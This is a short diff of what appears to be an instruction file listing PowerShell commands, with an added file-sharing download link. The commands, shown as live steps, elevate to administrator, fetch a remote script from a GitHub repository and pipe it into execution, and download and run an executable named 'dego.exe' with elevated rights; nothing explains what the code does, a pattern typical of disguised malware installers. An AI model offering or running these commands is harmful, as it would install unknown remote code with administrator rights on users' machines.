@@ -7,3 +7,5 @@ powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-c \"$E
 powershell -c "irm https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1 | iex"
 
 iwr "https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dego.exe" -OutFile "$env:TEMP\dego.exe" -UseBasicParsing; Start-Process "$env:TEMP\dego.exe" -Verb RunAs
+
+https://www.transfernow.net/dl/20260906w2KZGrSM
